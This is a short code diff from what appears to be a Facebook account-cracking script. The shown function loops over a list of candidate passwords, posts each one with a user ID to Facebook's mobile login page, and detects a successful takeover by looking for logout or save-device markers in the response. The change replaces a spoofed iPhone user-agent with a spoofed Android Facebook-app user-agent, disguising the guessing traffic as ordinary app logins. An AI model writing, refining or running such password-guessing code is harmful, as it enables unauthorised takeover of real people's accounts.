@@ -919,7 +919,7 @@ def manual():
 			pass
 		try:
 			for asu in pw.split(","):
-				ua_mb = 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_0 like Mac OS X; nb_NO) AppelWebKita (KHTML, like Gecko) Mobile [FBAN/FBForIphone;FVAV/4.0.2;FBBV/4020.0;FBDV/iPhone3.1;FBMD/iPhone;FBSN/iPhone OS; FBSV/5.0;FBSS/2; FVCR/Telenor;FBID/phone;FBLC/nb_NO;FBSF/2.0]'
+				ua_mb = 'Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]'
 				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua_mb})
 				xo = rex.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
